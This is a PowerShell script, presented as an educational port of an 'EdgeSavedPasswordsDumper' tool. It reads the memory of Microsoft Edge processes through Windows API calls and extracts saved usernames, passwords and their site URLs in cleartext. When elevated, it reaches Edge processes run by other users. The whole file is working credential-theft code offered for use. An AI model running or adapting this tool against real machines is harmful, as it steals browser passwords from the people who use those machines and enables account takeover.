#Requires -Version 5.0
<#
.SYNOPSIS
    Dumps cleartext credentials from msedge.exe process memory.
.DESCRIPTION
    PowerShell port of EdgeSavedPasswordsDumper. Walks committed PAGE_READWRITE
    regions of root msedge.exe processes and regex-matches saved-credential patterns.
    Educational use only.
#>

$ErrorActionPreference = 'Stop'

$nativeSrc = @'
using System;
using System.Runtime.InteropServices;

public static class Native {
    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint   AllocationProtect;
        public IntPtr RegionSize;
        public uint   State;
        public uint   Protect;
        public uint   Type;
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
'@

if (-not ('Native' -as [type])) {
    Add-Type -TypeDefinition $nativeSrc -Language CSharp
}

$PROCESS_QUERY_INFORMATION         = 0x0400
$PROCESS_VM_READ                   = 0x0010
$PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
$TOKEN_QUERY                       = 0x8
$MEM_COMMIT                        = 0x1000
$PAGE_READWRITE                    = 0x04
$MAX_REGION_BYTES                  = 256MB

function Get-ProcessOwnerFromToken {
    param([int]$TargetPid)

    $hProc = [Native]::OpenProcess($PROCESS_QUERY_LIMITED_INFORMATION, $false, $TargetPid)
    if ($hProc -eq [IntPtr]::Zero) { return 'UNKNOWN' }

    $hToken = [IntPtr]::Zero
    $ok = [Native]::OpenProcessToken($hProc, $TOKEN_QUERY, [ref]$hToken)
    if (-not $ok) {
        [void][Native]::CloseHandle($hProc)
        return 'UNKNOWN'
    }

    try {
        $wi = New-Object System.Security.Principal.WindowsIdentity($hToken)
        if ($wi.Name) { return $wi.Name } else { return 'UNKNOWN' }
    } catch {
        return 'UNKNOWN'
    } finally {
        [void][Native]::CloseHandle($hToken)
        [void][Native]::CloseHandle($hProc)
    }
}

# Elevation check
$identity   = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal  = New-Object System.Security.Principal.WindowsPrincipal($identity)
$isElevated = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isElevated) {
    Write-Host '[v]' -ForegroundColor Green -NoNewline
    Write-Host " Running elevated.`n"
} else {
    Write-Host '[x]' -ForegroundColor Red -NoNewline
    Write-Host " Not running elevated.`n"
    Write-Host "Program will only be able to access Edge processes ran by the same user."
    Write-Host "The program might also fail trying to look up owner of some Edge processes.`n"
}

Write-Host 'Fetching browser processes:' -NoNewline

$totalMatches        = 0
$shownMatches        = 0
$seenStrings         = New-Object 'System.Collections.Generic.HashSet[string]'
$alreadyCheckedUsers = New-Object 'System.Collections.Generic.HashSet[string]'

$edgeProcs   = Get-CimInstance Win32_Process -Filter "Name='msedge.exe'"
$processList = New-Object System.Collections.ArrayList

foreach ($p in $edgeProcs) {
    $skip = $false
    try {
        $parent = Get-Process -Id $p.ParentProcessId -ErrorAction Stop
        if ($parent.ProcessName -ieq 'msedge') { $skip = $true }
    } catch {
        # Parent exited → treat as root
    }
    if ($skip) { continue }

    [void]$processList.Add([PSCustomObject]@{
        Id    = [int]$p.ProcessId
        Name  = [string]$p.Name
        Owner = Get-ProcessOwnerFromToken -TargetPid ([int]$p.ProcessId)
    })
}

Write-Host " Done.`n"

# Same patterns as the C# version. Single-quoted to avoid PS interpolation;
# user/password are spliced in via [regex]::Escape and string concat.
$pwPattern = '[a-zA-Z]https?\x20([a-zA-ZæøåÆØÅ0-9\-_\.@\?]{1,20})\x20([a-zA-ZæøåÆØÅ0-9#!@#\$%\^&\*\(\)_\-\+=\{\}\[\]:;<>\?/~\s]{1,40})\x20\x00'
$miSize    = [System.Runtime.InteropServices.Marshal]::SizeOf([type][Native+MEMORY_BASIC_INFORMATION])

foreach ($proc in $processList) {
    $key = "$($proc.Owner) $($proc.Name)"
    if ($alreadyCheckedUsers.Contains($key)) { continue }

    $ownerDisplay = $proc.Owner -replace 'NSC\\t1_', ''
    Write-Host ("Scanning process PID: {0}`tName: {1}`tOwner: {2}" -f $proc.Id, $proc.Name, $ownerDisplay)

    $hProc = [Native]::OpenProcess(($PROCESS_QUERY_INFORMATION -bor $PROCESS_VM_READ), $false, $proc.Id)
    if ($hProc -eq [IntPtr]::Zero) {
        Write-Host "Failed to open process: $($proc.Id) $($proc.Name) $($proc.Owner)"
        continue
    }

    $address = [IntPtr]::Zero
    $memInfo = New-Object Native+MEMORY_BASIC_INFORMATION

    while ([Native]::VirtualQueryEx($hProc, $address, [ref]$memInfo, [uint32]$miSize) -ne 0) {
        $regionSize = $memInfo.RegionSize.ToInt64()
        $readable   = ($memInfo.State -eq $MEM_COMMIT) -and ($memInfo.Protect -eq $PAGE_READWRITE)

        if ($readable -and $regionSize -gt 0 -and $regionSize -le $MAX_REGION_BYTES) {
            $buffer    = New-Object byte[] $regionSize
            $bytesRead = [IntPtr]::Zero
            $ok        = [Native]::ReadProcessMemory($hProc, $memInfo.BaseAddress, $buffer, [int]$regionSize, [ref]$bytesRead)

            if ($ok) {
                $utf8  = [System.Text.Encoding]::UTF8.GetString($buffer)
                $lines = [regex]::Split($utf8, "`r`n|`r|`n")

                foreach ($line in $lines) {
                    $pwMatches = [regex]::Matches($line, $pwPattern)
                    foreach ($m in $pwMatches) {
                        $username  = $m.Groups[1].Value
                        $password  = $m.Groups[2].Value
                        $potential = "$username : $password"

                        $urlPattern = '\x00\x00\x00([A-Za-z0-9\-._~:/?#\[\]@!$&''()*+,;=%]+)(https?)\x20' `
                                    + [regex]::Escape($username) + ' ' + [regex]::Escape($password)

                        foreach ($u in [regex]::Matches($line, $urlPattern)) {
                            $combined = "$potential @$($u.Groups[1].Value)"
                            if (-not $seenStrings.Contains($combined)) {
                                Write-Host $combined
                                [void]$seenStrings.Add($combined)
                                $shownMatches++
                                $totalMatches++
                            }
                        }
                        [void]$alreadyCheckedUsers.Add($key)
                    }
                }
            }
            $buffer = $null
        }

        $address = [IntPtr]::new($memInfo.BaseAddress.ToInt64() + $regionSize)
    }

    [void][Native]::CloseHandle($hProc)
}

$seenStrings.Clear()
$seenStrings = $null

Write-Host "`nTotal matches found across all processes: $totalMatches. $shownMatches shown."
